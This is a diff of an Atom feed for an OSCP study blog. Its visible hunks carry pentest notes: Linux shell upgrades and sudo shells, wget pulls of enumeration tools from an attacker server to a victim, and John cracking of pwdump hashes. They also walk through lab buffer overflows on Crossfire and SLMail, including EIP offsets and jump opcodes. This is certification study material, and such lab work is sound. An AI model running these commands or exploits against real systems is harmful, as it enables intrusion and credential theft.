@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Daniel Haggerty's Blog - OSCP</title><link href="/" rel="alternate"></link><link href="/feeds/oscp.atom.xml" rel="self"></link><id>/</id><updated>2019-11-01T00:00:00-05:00</updated><entry><title>"Linux Privilege Escalation"</title><link href="/linux-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/linux-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;privesc_linux&lt;/span&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Digital Forensics - OSCP</title><link href="/" rel="alternate"></link><link href="/feeds/oscp.atom.xml" rel="self"></link><id>/</id><updated>2019-11-01T00:00:00-05:00</updated><entry><title>Linux Privilege Escalation</title><link href="/linux-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/linux-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;privesc_linux&lt;/span&gt;
 &lt;span class="n"&gt;UPGRADE&lt;/span&gt; &lt;span class="n"&gt;SHELL&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
 &lt;span class="n"&gt;ctrl&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Z&lt;/span&gt;
 &lt;span class="n"&gt;stty&lt;/span&gt; &lt;span class="n"&gt;raw&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;
@@ -29,9 +29,11 @@ BY HAND
 6. ps aux | grep root == john mysql -u root
 7. If webserver poke around database
 8. Look at original nmap scan for other shite running (nmap localhost)&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;sudo -u anotheruser command run sommand as another user
-sudo -u scriptmanager bash -i #run shell as user scriptmanager
-which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;sudo -u anotheruser command run sommand as another user&lt;/span&gt;
+&lt;span class="err"&gt;sudo -u scriptmanager bash -i #run shell as user scriptmanager&lt;/span&gt;
+&lt;span class="err"&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&amp;gt;/dev/null&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 &lt;p&gt;DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
 python -m SimpleHTTPServer
 wget -r 10.10.14.7:8000
@@ -141,7 +143,7 @@ cap_dac_read_search ←
 -rwxr-xr-x 1 root root 39752 Feb 22 2017 /usr/bin/tac
 man capabilities
 CAP_DAC_READ_SEARCH
-* Bypass file read permission checks and directory read and execute permission checks;&lt;/p&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Privilege Escalation"></category></entry><entry><title>"Windows Privilege Escalation"</title><link href="/windows-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/windows-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;icacls scsiaccess.exe&lt;/span&gt;
+* Bypass file read permission checks and directory read and execute permission checks;&lt;/p&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Privilege Escalation"></category></entry><entry><title>Windows Privilege Escalation</title><link href="/windows-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/windows-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;icacls scsiaccess.exe&lt;/span&gt;
 &lt;span class="err"&gt;...&lt;/span&gt;
 &lt;span class="c"&gt;Everyone: (I)(F)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -286,7 +288,7 @@ https://crackstation.net
 https://hashkiller.co.uk
 john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
-https://pentestlab.blog/2017/04/24/windows-kernel-exploits/&lt;/p&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Privilege Escalation"></category></entry><entry><title>"Linux Buffer Overflow"</title><link href="/linux-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/linux-buffer-overflow.html</id><summary type="html">&lt;h1&gt;Linux Buffer Overflow (Crossfire)&lt;/h1&gt;
+https://pentestlab.blog/2017/04/24/windows-kernel-exploits/&lt;/p&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Privilege Escalation"></category></entry><entry><title>Linux Buffer Overflow</title><link href="/linux-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/linux-buffer-overflow.html</id><summary type="html">&lt;h1&gt;Linux Buffer Overflow (Crossfire)&lt;/h1&gt;
 &lt;p&gt;Download a version of the vulnerable app Crossfire&lt;/p&gt;
 &lt;h3&gt;Setup safe environment: iptables only allow traffic from loopback interface=targetip&lt;/h3&gt;
 &lt;p&gt;iptables –A, -p, -d, -j # Append, protocol, destination, jump
@@ -298,22 +300,27 @@ iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j …&lt;/p&gt
 crossfire listens on port 13327
 iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j DROP
 iptables -A INPUT -p tcp --destination-port 4444 ! -d 127.0.0.1 -j DROP&lt;/p&gt;
-&lt;h3&gt;1. Run debugger and crash the app&lt;/h3&gt;
-&lt;p&gt;Get POC code from exploit db
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Run debugger and crash the app
+Get POC code from exploit db
 edb --run /usr/games/crossfire/bin/crossfire. In EDBG: Hit RUN twice
-crash = “\x41” &lt;em&gt;4379
+crash = “\x41” *4379
 buffer = “\x11(setup sound “ + crash + “\x90\x00#”
-python fuzz.py
-2. Control EIP
+python fuzz.py&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Control EIP
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
 Swap into the crash var: python linux_buffer_overflow.py 
 EIP has been overwritten with the hex characters… 46 36 70 46
 These are unique 4 bytes in the buffer. Now find where they are in the buffer.
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 -q 46367046
-[&lt;/em&gt;] Exact match at offset 4368
+[*] Exact match at offset 4368
 Replace “crash = "\x41" * 4368 + "B" * 4 + "C" * 7”: python EIP_BBBB.py&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Make space for the shellcode&lt;br&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Make space for the shellcode&lt;br&gt;
 Check for helpful registers: Follow in dump.
 EAX points to buffer start “setup sound “ opstring (len 12). Want to avoid these bytes. 
 ESP points to end of buffer “C * 7” (spare bytes). 
@@ -321,7 +328,8 @@ Add 12 bytes to EAX to align EAX with the A’s =&amp;gt; JMP EAX we skip over �
 /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm &amp;gt; add eax,12   83C00C add eax,byte +0xc
 nasm &amp;gt; jmp eax      FFE0 jmp eax
-Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. Looks like I didn’t test again here? Just note nasm output and move on?&lt;/li&gt;
+Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. Looks like I didn’t test again here? Just note nasm output and move on?&lt;/p&gt;
+&lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Discover bad characters
 All bad chars (except x00) contained in deault named script. Can use this for future.
@@ -355,7 +363,7 @@ buffer = "\x11(setup sound " + crash + "\x90\x00#“
 TURN OFF EDBG FOR EXPLOIT TO WORK: RUN CROSSFIRE: RUN EXPLOIT /usr/games/crossfire/bin/crossfire
 python exploit.py
 id; whoami&lt;/li&gt;
-&lt;/ol&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Buffer Overflow"></category></entry><entry><title>"Windows Buffer Overflow"</title><link href="/windows-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/windows-buffer-overflow.html</id><summary type="html">&lt;h1&gt;Windows Buffer Overflow (SLMail)&lt;/h1&gt;
+&lt;/ol&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Buffer Overflow"></category></entry><entry><title>Windows Buffer Overflow</title><link href="/windows-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/windows-buffer-overflow.html</id><summary type="html">&lt;h1&gt;Windows Buffer Overflow (SLMail)&lt;/h1&gt;
 &lt;p&gt;Seattle Lab Mail (SLMail) is fantastic vulnerable app to practise your buffer overflow on. You will have to download a version of the vulnerable SLMail to a Windows VM. The SLMail buffer overflow affects the &lt;strong&gt;POP3 PASS&lt;/strong&gt; command. Both the app itself and the exploit are …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Windows Buffer Overflow (SLMail)&lt;/h1&gt;
 &lt;p&gt;Seattle Lab Mail (SLMail) is fantastic vulnerable app to practise your buffer overflow on. You will have to download a version of the vulnerable SLMail to a Windows VM. The SLMail buffer overflow affects the &lt;strong&gt;POP3 PASS&lt;/strong&gt; command. Both the app itself and the exploit are available on Exploit Database (&lt;a href="https://www.exploit-db.com/exploits/638"&gt;exploit&lt;/a&gt;)!&lt;/p&gt;
 &lt;p&gt;You will have to jump between your Kali machine (to tweak your exploit) and the Windows VM (to restart SLMail after each crash and analyze the crash in Immunity Debugger) You will need &lt;a href="https://www.immunityinc.com/products/debugger/"&gt;Immunity Debugger&lt;/a&gt; to help develop your exploit.&lt;/p&gt;
@@ -1373,7 +1381,7 @@ searchsploit x PATH
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3&gt;Linux Privilege Escalation&lt;/h3&gt;
-&lt;h3&gt;Windows Privilege Escalation&lt;/h3&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Kali"></category></entry><entry><title>"Passing the OSCP Exam: Trying Smarter"</title><link href="/passing-the-oscp.html" rel="alternate"></link><published>2019-10-25T00:00:00-05:00</published><updated>2019-10-25T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-25:/passing-the-oscp.html</id><summary type="html">&lt;blockquote&gt;
+&lt;h3&gt;Windows Privilege Escalation&lt;/h3&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Kali"></category></entry><entry><title>Passing the OSCP Exam - Trying Smarter</title><link href="/passing-the-oscp.html" rel="alternate"></link><published>2019-10-25T00:00:00-05:00</published><updated>2019-10-25T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-25:/passing-the-oscp.html</id><summary type="html">&lt;blockquote&gt;
 &lt;p&gt;The definition of insanity is doing the same thing over and over again, but expecting different results.&lt;/p&gt;
 &lt;p&gt;&lt;cite&gt;Albert Einstein&lt;/cite&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -1428,10 +1436,9 @@ My third attempt was after a month or so of HackTheBox.
 The attitude was so different for each exam. For the first two attempts I was extrememly negative. i'd put chances at 10%. But on the third attempt I was bristling with confidence. &lt;/p&gt;
 &lt;h3&gt;Passing OSCP in a nutshell:&lt;/h3&gt;
 &lt;ol&gt;
-&lt;li&gt;HackTheBox &amp;amp; Ippsec&lt;/li&gt;
-&lt;li&gt;Buffer Overflow&lt;/li&gt;
+&lt;li&gt;Watch a lot of HackTheBox &amp;amp; Ippsec&lt;/li&gt;
+&lt;li&gt;Nail the Buffer Overflow&lt;/li&gt;
 &lt;li&gt;A relative disregard for the PWK material and labs (not including Buffer Overflow).&lt;/li&gt;
-&lt;li&gt;CherryTree Notes on HackTheBox and BufferOverflow&lt;/li&gt;
-&lt;li&gt;A later exam start with some planned sleep.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;The OSCP logo of the shadowy suited guy in the doorway that you get on your OSCP card is so lame. &lt;/p&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category></entry></feed>
+&lt;li&gt;Make extensive CherryTree Notes on HackTheBox and BufferOverflow&lt;/li&gt;
+&lt;li&gt;A later-in-the-day exam start with some planned sleep in the middle of the night.&lt;/li&gt;
+&lt;/ol&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category></entry></feed>
